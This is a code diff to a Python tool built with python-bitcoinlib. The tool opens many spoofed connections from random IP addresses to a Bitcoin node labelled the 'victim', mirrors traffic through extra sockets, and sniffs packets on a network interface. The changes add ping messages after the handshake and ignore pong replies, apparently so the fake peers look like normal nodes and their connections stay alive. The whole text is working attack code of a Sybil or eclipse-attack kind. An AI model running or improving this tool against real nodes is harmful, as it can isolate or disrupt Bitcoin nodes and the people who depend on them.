@@ -133,6 +133,12 @@ def version_packet(src_ip, dst_ip, src_port, dst_port):
 	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
 	return msg
 
+# Construct a ping packet using python-bitcoinlib
+def ping_packet():
+	msg = msg_ping(bitcoin_protocolversion)
+	msg.nonce = random.getrandbits(32)
+	return msg
+
 # Close a connection
 def close_connection(socket, ip, port, interface):
 	successful = False
@@ -212,26 +218,28 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		s.sendall(verack.to_bytes())
 		# Get verack packet
 		verack = s.recv(1024)
+		# Send a ping
+		s.sendall(ping_packet().to_bytes())
 	except:
 		print('Failed to send packets to victim')
 		close_connection(s, src_ip, src_port, interface)
 		rand_ip = random_ip()
 		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
+		return
 
 	if verbose: print('Connection successful!')
 
 	identity_address.append((src_ip, src_port))
 	identity_socket.append(s)
 
+	# Listen to the connections for future packets
+	if verbose: print(f'Attaching original packet listener to {interface}')
+	create_task(True, 'Victim identity ' + src_ip, sniff, s, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface)
 
 	mirror_socket = mirror_make_fake_connection(interface, src_ip, verbose)
 	if mirror_socket != None:
 		identity_mirror_socket.append(mirror_socket)
-
 	# Listen to the connections for future packets
-	if verbose: print(f'Attaching packet listener to {interface}')
-	create_task(True, 'Victim identity ' + src_ip, sniff, s, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface)
-
 	if mirror_socket != None:
 		if verbose: print(f'Attaching mirror packet listener to {interface}')
 		create_task(True, 'Mirror identity ' + src_ip, mirror_sniff, mirror_socket, s, src_ip, src_port, dst_ip, dst_port, interface)
@@ -284,6 +292,8 @@ def mirror_make_fake_connection(interface, src_ip, verbose=True):
 	s.sendall(verack.to_bytes())
 	# Get verack packet
 	verack = s.recv(1024)
+	# Send a ping
+	s.sendall(ping_packet().to_bytes())
 	if verbose: print('Mirrored connection successful!')
 	return s
 
@@ -354,6 +364,7 @@ def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip
 		except Exception as e:
 			print(f'Lost connection to ({victim_ip} : {victim_port})')
 			create_task(False, 'Reconnecting ' + victim_ip, reconnect, socket, mirror_socket, src_ip, src_port, victim_ip, victim_port, interface, sniff_func)
+	elif msg_type == 'pong': pass # Ignore version
 	elif msg_type == 'version': pass # Ignore version
 	elif msg_type == 'verack': pass # Ignore verack
 	else:
@@ -416,7 +427,6 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, s
 		if socket == None: return False # If the destination socket isn't running, ignore packet
 		# Parse the message payload
 		msg = MsgSerializable.from_bytes(packet)
-
 		pong = msg_pong(bitcoin_protocolversion)
 		pong.nonce = msg.nonce
 		try:
@@ -424,6 +434,7 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, s
 		except Exception as e:
 			print(f'Lost connection to ({attacker_ip} : {attacker_port})')
 			create_task(False, 'Reconnecting ' + attacker_ip, reconnect, socket, orig_socket, src_ip, src_port, attacker_ip, attacker_port, interface, sniff_func)
+	elif msg_type == 'pong': pass
 	else:
 		if orig_socket == None: return False # If the destination socket isn't running, ignore packet
 		try:
